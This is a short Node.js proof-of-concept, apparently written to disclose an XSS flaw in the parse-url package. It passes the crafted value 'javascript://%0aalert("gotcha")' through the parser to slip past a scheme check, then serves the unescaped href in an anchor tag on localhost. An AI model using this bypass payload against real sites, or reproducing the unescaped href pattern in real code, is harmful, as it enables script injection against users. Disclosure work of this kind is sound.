// parse-url XSS demo
const http = require("http");
const parseUrl = require("parse-url");
// escape parseUrl using special character escape
const url = parseUrl('javascript://%0aalert("gotcha")');
console.log(url);

const server = http.createServer((req, res) => {
    res.writeHead(200);

    if (url.scheme !== "javascript" && url.scheme !== null) {
        res.end("<a href=\'" + url.href + "\'>Wowww!</a>" );
    } else {
        res.end("Nooo!");
    }
});

server.listen(8080, "127.0.0.1",function() {
    console.log("http://"+this.address().address+":"+this.address().port);
});